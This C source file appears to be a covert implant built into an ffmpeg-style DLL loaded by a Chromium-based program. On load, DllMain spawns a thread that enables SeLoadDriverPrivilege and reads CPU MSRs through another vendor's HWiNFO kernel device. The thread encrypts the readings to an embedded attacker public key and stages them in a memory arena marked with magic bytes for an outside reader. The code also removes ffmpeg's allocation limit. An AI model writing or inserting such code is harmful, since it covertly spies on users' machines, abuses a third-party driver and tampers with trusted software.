/* MTRR snapshot via GamePP's HWiNFO device. C only.
 * JSON is ECDH P-256 + AES-256-GCM sealed into a 16KiB VirtualAlloc arena.
 * Refresh failure keeps the previous published frame.
 */
#include <intrin.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <bcrypt.h>

#include "chromium/mtrr_blob.h"
#include "libavutil/mem.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(linker, "/INCLUDE:_kMtrrPatchSlot")

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

enum { kIoctlRdMsr = 0x85FE2604u, kIntervalMs = 60000 };

#pragma pack(push, 1)
struct MsrBuf {
  uint32_t msr;
  uint32_t reserved;
  uint64_t value;
};
#pragma pack(pop)

_Static_assert(sizeof(struct MsrBuf) == 16, "RdMSR buffer must be 16 bytes");
_Static_assert(kMtrrArenaIvOff == kMtrrArenaEphPubOff + kMtrrEccPubLen,
               "ephemeral key must sit against the IV");
_Static_assert(kMtrrArenaCtOff == kMtrrArenaIvOff + kMtrrArenaIvLen,
               "ciphertext must follow the IV");
_Static_assert(kMtrrArenaFtrMagicOff == kMtrrArenaSize - 16,
               "footer magic is the last 16 bytes");
_Static_assert(kMtrrSlotCookieEndOff == kMtrrSlotPubkeyOff + kMtrrSlotPubkeyCap,
               "end cookie follows the public-key cap");

struct JsonBuf {
  char *p;
  size_t cap;
  size_t n;
  int ok;
};

static HANDLE g_stop;
static BCRYPT_ALG_HANDLE g_ecdh;
static BCRYPT_ALG_HANDLE g_aes;
static BCRYPT_KEY_HANDLE g_peer;
static uint8_t *g_arena;
static uint8_t g_hdr[16];
static uint8_t g_ftr[16];
static int g_have_frame;

static const uint32_t kFixMsr[] = {
    0x250u, 0x258u, 0x259u, 0x268u, 0x269u, 0x26Au,
    0x26Bu, 0x26Cu, 0x26Du, 0x26Eu, 0x26Fu};
static const char *kFixName[] = {
    "FIX64K_00000", "FIX16K_80000", "FIX16K_A0000", "FIX4K_C0000",
    "FIX4K_C8000",  "FIX4K_D0000",  "FIX4K_D8000",  "FIX4K_E0000",
    "FIX4K_E8000",  "FIX4K_F0000",  "FIX4K_F8000"};

static const char *MtrrTypeName(uint8_t t) {
  switch (t) {
    case 0: return "UC";
    case 1: return "WC";
    case 4: return "WT";
    case 5: return "WP";
    case 6: return "WB";
    default: return "?";
  }
}

static int WaitStop(DWORD ms) {
  return g_stop && WaitForSingleObject(g_stop, ms) == WAIT_OBJECT_0;
}

static void EnableLoadDriverPrivilege(void) {
  HANDLE token = NULL;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
    return;
  }
  if (!LookupPrivilegeValueW(NULL, L"SeLoadDriverPrivilege", &luid)) {
    CloseHandle(token);
    return;
  }
  memset(&tp, 0, sizeof(tp));
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  AdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL);
  CloseHandle(token);
}

static HANDLE OpenHwinfoDevice(void) {
  static const char *names[] = {
      "\\\\.\\HWiNFO_216", "\\\\.\\HWiNFO_215", "\\\\.\\HWiNFO_217",
      "\\\\.\\HWiNFO_214", "\\\\.\\Global\\HWiNFO_216",
      "\\\\.\\Global\\HWiNFO_215",
  };
  unsigned i;
  for (i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
    HANDLE h = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE)
      return h;
  }
  return INVALID_HANDLE_VALUE;
}

static int ReadMsr(HANDLE dev, uint32_t msr, uint64_t *out, DWORD *err_out) {
  struct MsrBuf buf;
  DWORD returned = 0;
  memset(&buf, 0, sizeof(buf));
  buf.msr = msr;
  if (!DeviceIoControl(dev, kIoctlRdMsr, &buf, sizeof(buf), &buf, sizeof(buf),
                       &returned, NULL)) {
    if (err_out)
      *err_out = GetLastError();
    return 0;
  }
  *out = buf.value;
  if (err_out)
    *err_out = 0;
  return 1;
}

static int ThisProcessMayDump(void) {
  const wchar_t *cl = GetCommandLineW();
  HANDLE mtx;
  if (cl && (wcsstr(cl, L"--type=renderer") || wcsstr(cl, L"--type=utility")))
    return 0;
  mtx = CreateMutexW(NULL, FALSE, L"Local\\ffmpeg-mtrr-dump-owner");
  if (!mtx)
    return 0;
  if (GetLastError() == ERROR_ALREADY_EXISTS) {
    CloseHandle(mtx);
    return 0;
  }
  return 1;
}

static uint64_t UnixSeconds(void) {
  FILETIME ft;
  ULARGE_INTEGER u;
  GetSystemTimeAsFileTime(&ft);
  u.LowPart = ft.dwLowDateTime;
  u.HighPart = ft.dwHighDateTime;
  if (u.QuadPart < 116444736000000000ull)
    return 0;
  return (u.QuadPart - 116444736000000000ull) / 10000000ull;
}

static void JRaw(struct JsonBuf *j, const char *s, size_t n) {
  if (!j->ok)
    return;
  if (j->n + n >= j->cap) {
    j->ok = 0;
    return;
  }
  memcpy(j->p + j->n, s, n);
  j->n += n;
  j->p[j->n] = 0;
}

static void JStr(struct JsonBuf *j, const char *s) {
  JRaw(j, s, strlen(s));
}

static void JFmt(struct JsonBuf *j, const char *fmt, ...) {
  char tmp[192];
  va_list ap;
  int n;
  if (!j->ok)
    return;
  va_start(ap, fmt);
  n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
  va_end(ap);
  if (n < 0 || (size_t)n >= sizeof(tmp)) {
    j->ok = 0;
    return;
  }
  JRaw(j, tmp, (size_t)n);
}

static void JHex64(struct JsonBuf *j, uint64_t v) {
  JFmt(j, "\"0x%016llX\"", (unsigned long long)v);
}

static void JMsr(struct JsonBuf *j, HANDLE dev, uint32_t msr) {
  uint64_t v = 0;
  if (ReadMsr(dev, msr, &v, NULL))
    JHex64(j, v);
  else
    JStr(j, "null");
}

static int EnsureReady(void) {
  BCRYPT_ALG_HANDLE ecdh = NULL;
  BCRYPT_ALG_HANDLE aes = NULL;
  BCRYPT_KEY_HANDLE peer = NULL;
  uint8_t *arena = NULL;
  uint32_t ver = 0, pklen = 0, magic = 0, cbkey = 0;
  NTSTATUS st;
  const unsigned char *slot = kMtrrPatchSlot;

  if (g_arena && g_peer && g_ecdh && g_aes)
    return 1;

  memcpy(&ver, slot + kMtrrSlotVersionOff, 4);
  memcpy(&pklen, slot + kMtrrSlotPubkeyLenOff, 4);
  memcpy(&magic, slot + kMtrrSlotPubkeyOff, 4);
  memcpy(&cbkey, slot + kMtrrSlotPubkeyOff + 4, 4);
  if (ver != kMtrrSlotVersion || pklen != kMtrrEccPubLen ||
      magic != BCRYPT_ECDH_PUBLIC_P256_MAGIC || cbkey != kMtrrEccCoordLen)
    return 0;

  st = BCryptOpenAlgorithmProvider(&ecdh, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(st))
    goto fail;
  st = BCryptOpenAlgorithmProvider(&aes, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(st))
    goto fail;
  st = BCryptSetProperty(aes, BCRYPT_CHAINING_MODE,
                         (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                         sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
  if (!NT_SUCCESS(st))
    goto fail;
  st = BCryptImportKeyPair(ecdh, NULL, BCRYPT_ECCPUBLIC_BLOB, &peer,
                           (PUCHAR)(slot + kMtrrSlotPubkeyOff), pklen, 0);
  if (!NT_SUCCESS(st))
    goto fail;
  arena = (uint8_t *)VirtualAlloc(NULL, kMtrrArenaSize,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!arena)
    goto fail;

  memcpy(g_hdr, slot + kMtrrSlotHdrMagicOff, 16);
  memcpy(g_ftr, slot + kMtrrSlotFtrMagicOff, 16);
  g_ecdh = ecdh;
  g_aes = aes;
  g_peer = peer;
  g_arena = arena;
  return 1;

fail:
  if (peer)
    BCryptDestroyKey(peer);
  if (ecdh)
    BCryptCloseAlgorithmProvider(ecdh, 0);
  if (aes)
    BCryptCloseAlgorithmProvider(aes, 0);
  if (arena)
    VirtualFree(arena, 0, MEM_RELEASE);
  return 0;
}

static int EncryptAndPublish(const char *json, uint32_t json_len) {
  BCRYPT_KEY_HANDLE eph = NULL;
  BCRYPT_KEY_HANDLE sym = NULL;
  BCRYPT_SECRET_HANDLE secret = NULL;
  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
  BCryptBuffer kdf_buf;
  BCryptBufferDesc kdf_desc;
  wchar_t hash_alg[] = BCRYPT_SHA256_ALGORITHM;
  UCHAR eph_blob[72];
  UCHAR iv[12];
  UCHAR aes_key[32];
  UCHAR tag[16];
  UCHAR ct[kMtrrJsonCap];
  ULONG written = 0;
  ULONG cb = 0;
  NTSTATUS st;
  uint32_t ver = kMtrrArenaVersion;
  uint32_t flags = 0;
  uint32_t reserved = 0;
  uint8_t *after;
  size_t tail;
  int ok = 0;

  if (!g_arena || !g_peer || !g_ecdh || !g_aes)
    return 0;
  if (json_len == 0 || json_len > kMtrrJsonCap)
    return 0;
  if ((size_t)kMtrrArenaCtOff + json_len + kMtrrArenaTagLen >
      (size_t)kMtrrArenaFtrMagicOff)
    return 0;

  st = BCryptGenerateKeyPair(g_ecdh, &eph, 256, 0);
  if (!NT_SUCCESS(st))
    goto done;
  st = BCryptFinalizeKeyPair(eph, 0);
  if (!NT_SUCCESS(st))
    goto done;
  cb = sizeof(eph_blob);
  st = BCryptExportKey(eph, NULL, BCRYPT_ECCPUBLIC_BLOB, eph_blob,
                       sizeof(eph_blob), &cb, 0);
  if (!NT_SUCCESS(st) || cb != sizeof(eph_blob))
    goto done;
  st = BCryptSecretAgreement(eph, g_peer, &secret, 0);
  if (!NT_SUCCESS(st))
    goto done;

  kdf_buf.cbBuffer = (ULONG)((wcslen(hash_alg) + 1) * sizeof(wchar_t));
  kdf_buf.BufferType = KDF_HASH_ALGORITHM;
  kdf_buf.pvBuffer = hash_alg;
  kdf_desc.ulVersion = BCRYPTBUFFER_VERSION;
  kdf_desc.cBuffers = 1;
  kdf_desc.pBuffers = &kdf_buf;
  written = sizeof(aes_key);
  st = BCryptDeriveKey(secret, BCRYPT_KDF_HASH, &kdf_desc, aes_key,
                       sizeof(aes_key), &written, 0);
  if (!NT_SUCCESS(st) || written != sizeof(aes_key))
    goto done;

  st = BCryptGenRandom(NULL, iv, sizeof(iv), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
  if (!NT_SUCCESS(st))
    goto done;
  st = BCryptGenerateSymmetricKey(g_aes, &sym, NULL, 0, aes_key,
                                  sizeof(aes_key), 0);
  if (!NT_SUCCESS(st))
    goto done;

  BCRYPT_INIT_AUTH_MODE_INFO(auth);
  auth.pbNonce = iv;
  auth.cbNonce = sizeof(iv);
  auth.pbTag = tag;
  auth.cbTag = sizeof(tag);
  written = 0;
  st = BCryptEncrypt(sym, (PUCHAR)json, json_len, &auth, NULL, 0, ct, json_len,
                     &written, 0);
  if (!NT_SUCCESS(st) || written != json_len)
    goto done;

  memset(g_arena, 0, 16);
  _ReadWriteBarrier();
  memcpy(g_arena + kMtrrArenaVersionOff, &ver, 4);
  memcpy(g_arena + kMtrrArenaFlagsOff, &flags, 4);
  memcpy(g_arena + kMtrrArenaJsonLenOff, &json_len, 4);
  memcpy(g_arena + kMtrrArenaReservedOff, &reserved, 4);
  memcpy(g_arena + kMtrrArenaEphPubOff, eph_blob, sizeof(eph_blob));
  memcpy(g_arena + kMtrrArenaIvOff, iv, sizeof(iv));
  memcpy(g_arena + kMtrrArenaCtOff, ct, json_len);
  memcpy(g_arena + kMtrrArenaCtOff + json_len, tag, sizeof(tag));
  after = g_arena + kMtrrArenaCtOff + json_len + kMtrrArenaTagLen;
  tail = (size_t)(g_arena + kMtrrArenaFtrMagicOff - after);
  if (tail)
    memset(after, 0, tail);
  memcpy(g_arena + kMtrrArenaFtrMagicOff, g_ftr, 16);
  _ReadWriteBarrier();
  memcpy(g_arena, g_hdr, 16);
  ok = 1;

done:
  SecureZeroMemory(aes_key, sizeof(aes_key));
  if (sym)
    BCryptDestroyKey(sym);
  if (secret)
    BCryptDestroySecret(secret);
  if (eph)
    BCryptDestroyKey(eph);
  return ok;
}

static int BuildJson(HANDLE dev, struct JsonBuf *j) {
  int regs[4];
  uint32_t ebx, ecx, edx, sig, feat_edx, family, model;
  uint32_t base_family, base_model, ext_family, ext_model;
  int has_mtrr, has_pat, has_msr, fix, wc;
  uint32_t vcnt, pairs, i;
  uint64_t cap = 0, def = 0;
  const char *vendor = "Unknown";
  const char *type_name;

  __cpuid(regs, 0);
  ebx = (uint32_t)regs[1];
  ecx = (uint32_t)regs[2];
  edx = (uint32_t)regs[3];
  if (ebx == 0x756e6547u && edx == 0x49656e69u && ecx == 0x6c65746eu)
    vendor = "Intel";
  else if (ebx == 0x68747541u && edx == 0x69746e65u && ecx == 0x444d4163u)
    vendor = "AMD";

  __cpuid(regs, 1);
  sig = (uint32_t)regs[0];
  feat_edx = (uint32_t)regs[3];
  base_family = (sig >> 8) & 0xfu;
  base_model = (sig >> 4) & 0xfu;
  ext_family = (sig >> 20) & 0xffu;
  ext_model = (sig >> 16) & 0xfu;
  family = base_family == 0xfu ? base_family + ext_family : base_family;
  model = (base_family == 6u || base_family == 0xfu)
              ? base_model + (ext_model << 4)
              : base_model;
  has_mtrr = (feat_edx & (1u << 12)) != 0;
  has_pat = (feat_edx & (1u << 16)) != 0;
  has_msr = (feat_edx & (1u << 5)) != 0;

  JStr(j, "{\"v\":1,\"ts\":");
  JFmt(j, "%llu", (unsigned long long)UnixSeconds());
  JFmt(j, ",\"pid\":%lu", (unsigned long)GetCurrentProcessId());
  JFmt(j, ",\"vendor\":\"%s\",\"family\":%u,\"model\":\"%02X\"", vendor, family,
       model);
  JFmt(j, ",\"feat\":{\"mtrr\":%d,\"pat\":%d,\"msr\":%d}", has_mtrr, has_pat,
       has_msr);

  if (!has_mtrr || !has_msr)
    return 0;
  if (!ReadMsr(dev, 0x0FEu, &cap, NULL))
    return 0;
  vcnt = (uint32_t)(cap & 0xffu);
  fix = (cap & (1ull << 8)) != 0;
  wc = (cap & (1ull << 10)) != 0;
  JStr(j, ",\"mtrrcap\":{\"raw\":");
  JHex64(j, cap);
  JFmt(j, ",\"vcnt\":%u,\"fix\":%d,\"wc\":%d}", vcnt, fix, wc);

  pairs = vcnt > 40u ? 40u : vcnt;
  JStr(j, ",\"var\":[");
  for (i = 0; i < pairs; i++) {
    if (i)
      JStr(j, ",");
    JFmt(j, "{\"i\":%u,\"base\":", i);
    JMsr(j, dev, 0x200u + i * 2u);
    JStr(j, ",\"mask\":");
    JMsr(j, dev, 0x201u + i * 2u);
    JStr(j, "}");
  }
  JStr(j, "]");

  if (fix) {
    JStr(j, ",\"fix\":{");
    for (i = 0; i < sizeof(kFixMsr) / sizeof(kFixMsr[0]); i++) {
      if (i)
        JStr(j, ",");
      JFmt(j, "\"%s\":", kFixName[i]);
      JMsr(j, dev, kFixMsr[i]);
    }
    JStr(j, "}");
  }
  if (has_pat) {
    JStr(j, ",\"pat\":");
    JMsr(j, dev, 0x277u);
  }

  JStr(j, ",\"def\":{\"raw\":");
  if (ReadMsr(dev, 0x2FFu, &def, NULL)) {
    type_name = MtrrTypeName((uint8_t)def);
    JHex64(j, def);
    JFmt(j, ",\"enable\":%d,\"fixed\":%d,\"type\":\"%s\"}",
         (int)((def & (1ull << 11)) != 0), (int)((def & (1ull << 10)) != 0),
         type_name);
  } else {
    JStr(j, "null,\"enable\":null,\"fixed\":null,\"type\":null}");
  }
  JStr(j, "}");
  return j->ok;
}

static int CaptureAndPublish(void) {
  HANDLE dev;
  char json[kMtrrJsonCap];
  struct JsonBuf j;
  int built;

  if (!EnsureReady())
    return 0;
  dev = OpenHwinfoDevice();
  if (dev == INVALID_HANDLE_VALUE)
    return 0;
  memset(&j, 0, sizeof(j));
  j.p = json;
  j.cap = sizeof(json);
  j.ok = 1;
  built = BuildJson(dev, &j);
  CloseHandle(dev);
  if (!built || !j.ok || j.n == 0)
    return 0;
  return EncryptAndPublish(json, (uint32_t)j.n);
}

static DWORD WINAPI MtrrDumpThread(LPVOID unused) {
  (void)unused;
  EnableLoadDriverPrivilege();
  while (!WaitStop(0)) {
    if (CaptureAndPublish())
      g_have_frame = 1;
    if (WaitStop(g_have_frame ? kIntervalMs : 500))
      break;
  }
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
  HANDLE th;
  (void)reserved;
  if (reason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(instance);
    av_max_alloc((size_t)-1);
    if (!ThisProcessMayDump())
      return TRUE;
    g_stop = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_stop)
      return TRUE;
    th = CreateThread(NULL, 0, MtrrDumpThread, NULL, 0, NULL);
    if (th)
      CloseHandle(th);
  } else if (reason == DLL_PROCESS_DETACH) {
    if (g_stop)
      SetEvent(g_stop);
  }
  return TRUE;
}
